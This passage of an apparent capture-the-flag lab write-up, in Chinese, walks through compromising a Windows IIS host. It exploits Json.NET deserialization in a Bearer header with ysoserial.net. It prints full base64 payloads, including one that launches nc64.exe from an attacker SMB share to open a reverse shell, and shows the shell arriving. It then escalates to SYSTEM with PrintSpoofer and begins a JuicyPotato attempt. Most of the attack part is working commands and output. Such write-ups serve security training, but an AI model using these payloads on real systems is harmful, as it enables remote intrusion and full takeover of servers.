+</span></span><span style="display:flex;"><span>.controller<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;loginController&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span>$http<span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span>$scope<span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span>$cookies<span style="color:#e6db74">&#34;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>$http, $scope, $cookies<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        // 初始化登录凭证
+</span></span><span style="display:flex;"><span>        $scope.credentials <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> 
+</span></span><span style="display:flex;"><span>            UserName: <span style="color:#e6db74">&#34;&#34;</span>, 
+</span></span><span style="display:flex;"><span>            Password: <span style="color:#e6db74">&#34;&#34;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        // 初始化错误信息
+</span></span><span style="display:flex;"><span>        $scope.error <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> 
+</span></span><span style="display:flex;"><span>            message: <span style="color:#e6db74">&#34;&#34;</span>, 
+</span></span><span style="display:flex;"><span>            show: false 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        // 检查是否已有 OAuth2 token
+</span></span><span style="display:flex;"><span>        var token <span style="color:#f92672">=</span> $cookies.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;OAuth2&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>token<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> 
+</span></span><span style="display:flex;"><span>            // 如果已登录，重定向到首页
+</span></span><span style="display:flex;"><span>            window.location.href <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.html&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        // 登录函数
+</span></span><span style="display:flex;"><span>        $scope.login <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            // POST 请求到 /api/token 端点
+</span></span><span style="display:flex;"><span>            $http.post<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/api/token&#34;</span>, $scope.credentials<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                .then<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>response<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                        // 登录成功，跳转到首页
+</span></span><span style="display:flex;"><span>                        window.location.href <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.html&#34;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>, 
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>error<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                        // 登录失败，显示错误信息
+</span></span><span style="display:flex;"><span>                        $scope.error.message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Invalid Credentials.&#34;</span>;
+</span></span><span style="display:flex;"><span>                        $scope.error.show <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>                        console.log<span style="color:#f92672">(</span>error<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// 主控制器
+</span></span><span style="display:flex;"><span>.controller<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;principalController&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span>$http<span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span>$scope<span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span>$cookies<span style="color:#e6db74">&#34;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>$http, $scope, $cookies<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        // 获取 OAuth2 token
+</span></span><span style="display:flex;"><span>        var token <span style="color:#f92672">=</span> $cookies.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;OAuth2&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>token<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            // 使用 token 获取用户信息
+</span></span><span style="display:flex;"><span>            $http.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/api/Account/&#34;</span>, <span style="color:#f92672">{</span> 
+</span></span><span style="display:flex;"><span>                headers: <span style="color:#f92672">{</span> 
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;Bearer&#34;</span>: token 
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>            .then<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>response<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    // 设置用户名
+</span></span><span style="display:flex;"><span>                    $scope.UserName <span style="color:#f92672">=</span> response.data.Name;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>error<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    // Token 无效，删除并重定向到登录页
+</span></span><span style="display:flex;"><span>                    $cookies.remove<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;OAuth2&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>                    window.location.href <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;login.html&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            // 没有 token，重定向到登录页
+</span></span><span style="display:flex;"><span>            window.location.href <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;login.html&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">])</span>;
+</span></span></code></pre></div><p>定义了两个控制器 <code>loginController</code> 和 <code>principalController</code> 用于处理登录和验证功能。</p>
+<p>在登录界面随便输入账号密码，使用 burpsuite 抓包观察。</p>
+<p><img src="Pasted%20image%2020260302112209.png" alt=""></p>
+<p>发送至 Repeater，重放查看结果。</p>
+<p><img src="Pasted%20image%2020260302112321.png" alt=""></p>
+<p>根据前面解混淆的 js 源码，将方法改为 GET，传输至  <code>/api/Account</code>，随便给个 <code>Bearer</code>。</p>
+<p><img src="Pasted%20image%2020260302113001.png" alt="">
+如果将 Bearer 的长度缩短则会报错 <code>Cannot deserialize Json.Net Object</code>，说明此处用 Json.net Object 做反序列化。由于 Bearer 给的值是明文 <code>enil</code>，所以不能反序列化，需要将 Bearer 字段调整为同程序大小一致。</p>
+<p><img src="Pasted%20image%2020260302143248.png" alt=""></p>
+<p>以上内容表明技术栈为 ASP.NET，并且使用的是 Json.net 库处理 JSON 数据，使用 ysoserial.net 生成 payload。</p>
+<p>使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> PS D:<span style="color:#ae81ff">\G</span>ithub Study<span style="color:#ae81ff">\Y</span>soserial<span style="color:#ae81ff">\y</span>soserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9<span style="color:#ae81ff">\R</span>elease&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -c <span style="color:#e6db74">&#34;ping -n 10 10.10.16.155&#34;</span> -o base64 -g ObjectDataProvider -f Json.Net
+</span></span><span style="display:flex;"><span>ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>在 kali 中使用 tshark 监控流量，再将生成的 payload 给到 Bearer，重放。</p>
+<p><img src="Pasted%20image%2020260302145914.png" alt=""></p>
+<p>kali 捕捉到了 ping 的访问，证明反序列化是存在漏洞的，在 kali 中准备好 nc，使用 smbserber 远程执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah nc64.exe 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2551692</span> -rwxrwxrwx <span style="color:#ae81ff">1</span> kali kali 54K Dec <span style="color:#ae81ff">15</span> 00:40 nc64.exe
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo impacket-smbserver Enil . -smb2support
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>进一步生成 payload。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> PS D:<span style="color:#ae81ff">\G</span>ithub Study<span style="color:#ae81ff">\Y</span>soserial<span style="color:#ae81ff">\y</span>soserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9<span style="color:#ae81ff">\R</span>elease&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -c <span style="color:#e6db74">&#34;START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe&#34;</span> -o base64 -g ObjectDataProvider -f Json.Net
+</span></span><span style="display:flex;"><span>ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
+</span></span></code></pre></div><ul>
+<li>-c：表示 <code>command</code>，指定执行的系统命令</li>
+<li>START /B：启动新进程，在 Windows 上后台运行，不打开新窗口。这里是执行一个后台任务</li>
+<li>-o：指定输出的格式</li>
+<li>-g：表示使用的 gadget，它们在反序列化过程中可以被利用来执行任意代码。<code>ObjectDataProvider</code> 是此处指定的 gadget 类型，是 WPF 框架中的一个类，常用于执行命令注入。</li>
+<li>-f：指定序列化框架</li>
+</ul>
+<p>启动监听，将 payload 填入 Bearer，重放。得到一个 cmd 的回显。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/CVE-2015-1635-POC<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.155<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.227.191<span style="color:#f92672">]</span> <span style="color:#ae81ff">50626</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;hostname
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>json
+</span></span></code></pre></div><p>查看 systeminfo。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;systeminfo
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host Name:                 JSON
+</span></span><span style="display:flex;"><span>OS Name:                   Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter
+</span></span><span style="display:flex;"><span>OS Version:                6.3.9600 N/A Build <span style="color:#ae81ff">9600</span>
+</span></span><span style="display:flex;"><span>OS Manufacturer:           Microsoft Corporation
+</span></span><span style="display:flex;"><span>OS Configuration:          Standalone Server
+</span></span><span style="display:flex;"><span>OS Build Type:             Multiprocessor Free
+</span></span><span style="display:flex;"><span>Registered Owner:          Windows User
+</span></span><span style="display:flex;"><span>Registered Organization:   
+</span></span><span style="display:flex;"><span>Product ID:                00252-80005-00001-AA602
+</span></span><span style="display:flex;"><span>Original Install Date:     5/22/2019, 4:27:16 PM
+</span></span><span style="display:flex;"><span>System Boot Time:          3/1/2026, 8:27:41 PM
+</span></span><span style="display:flex;"><span>System Manufacturer:       VMware, Inc.
+</span></span><span style="display:flex;"><span>System Model:              VMware Virtual Platform
+</span></span><span style="display:flex;"><span>System Type:               x64-based PC
+</span></span><span style="display:flex;"><span>Processor<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:              <span style="color:#ae81ff">2</span> Processor<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: AMD64 Family <span style="color:#ae81ff">23</span> Model <span style="color:#ae81ff">49</span> Stepping <span style="color:#ae81ff">0</span> AuthenticAMD ~2994 Mhz
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>02<span style="color:#f92672">]</span>: AMD64 Family <span style="color:#ae81ff">23</span> Model <span style="color:#ae81ff">49</span> Stepping <span style="color:#ae81ff">0</span> AuthenticAMD ~2994 Mhz
+</span></span><span style="display:flex;"><span>BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
+</span></span><span style="display:flex;"><span>Windows Directory:         C:<span style="color:#ae81ff">\W</span>indows
+</span></span><span style="display:flex;"><span>System Directory:          C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32
+</span></span><span style="display:flex;"><span>Boot Device:               <span style="color:#ae81ff">\D</span>evice<span style="color:#ae81ff">\H</span>arddiskVolume1
+</span></span><span style="display:flex;"><span>System Locale:             en-us;English <span style="color:#f92672">(</span>United States<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Input Locale:              es-mx;Spanish <span style="color:#f92672">(</span>Mexico<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time Zone:                 <span style="color:#f92672">(</span>UTC-05:00<span style="color:#f92672">)</span> Eastern Time <span style="color:#f92672">(</span>US &amp; Canada<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Total Physical Memory:     8,191 MB
+</span></span><span style="display:flex;"><span>Available Physical Memory: 7,535 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: Max Size:  9,471 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: Available: 8,808 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: In Use:    <span style="color:#ae81ff">663</span> MB
+</span></span><span style="display:flex;"><span>Page File Location<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:     C:<span style="color:#ae81ff">\p</span>agefile.sys
+</span></span><span style="display:flex;"><span>Domain:                    WORKGROUP
+</span></span><span style="display:flex;"><span>Logon Server:              N/A
+</span></span><span style="display:flex;"><span>Hotfix<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:                 N/A
+</span></span><span style="display:flex;"><span>Network Card<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:           <span style="color:#ae81ff">1</span> NIC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: vmxnet3 Ethernet Adapter
+</span></span><span style="display:flex;"><span>                                 Connection Name: Ethernet0 <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>                                 DHCP Enabled:    Yes
+</span></span><span style="display:flex;"><span>                                 DHCP Server:     10.10.10.2
+</span></span><span style="display:flex;"><span>                                 IP address<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: 10.129.227.191
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>02<span style="color:#f92672">]</span>: fe80::f19f:1378:66b2:439f
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>03<span style="color:#f92672">]</span>: dead:beef::f19f:1378:66b2:439f
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>04<span style="color:#f92672">]</span>: dead:beef::4f
+</span></span><span style="display:flex;"><span>Hyper-V Requirements:      A hypervisor has been detected. Features required <span style="color:#66d9ef">for</span> Hyper-V will not be displayed.
+</span></span></code></pre></div><h2 id="提权枚举">提权枚举</h2>
+<p>查看当前用户权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;whoami /priv
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></span></code></pre></div><p>有 SeImpersonatePrivilege 权限，可以考虑烂土豆提权。也可以使用 PrintSpoofer 提权。</p>
+<p>将 PrintSpoofer 传进靶机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;cd c:<span style="color:#ae81ff">\p</span>rogramdata
+</span></span><span style="display:flex;"><span>cd c:<span style="color:#ae81ff">\p</span>rogramdata
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData&gt;mkdir apps
+</span></span><span style="display:flex;"><span>mkdir apps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData&gt;cd apps
+</span></span><span style="display:flex;"><span>cd apps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\P</span>rintSpoofer64.exe .<span style="color:#ae81ff">\P</span>rintSpoofer64.exe
+</span></span><span style="display:flex;"><span>copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\P</span>rintSpoofer64.exe .<span style="color:#ae81ff">\P</span>rintSpoofer64.exe
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AEF2-0DF2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/02/2026  03:00 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/02/2026  03:00 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         27,136 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,351,168 bytes free
+</span></span></code></pre></div><p>尝试执行提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span>PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Named pipe listening...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CreateProcessAsUser<span style="color:#f92672">()</span> OK
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><h2 id="其他提权思路">其他提权思路</h2>
+<h3 id="土豆提权">土豆提权</h3>
+<p>将 JuicyPotato.exe 传入靶机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\J</span>uicyPotato.exe .<span style="color:#ae81ff">\J</span>uicyPotato.exe
+</span></span><span style="display:flex;"><span>copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\J</span>uicyPotato.exe .<span style="color:#ae81ff">\J</span>uicyPotato.exe
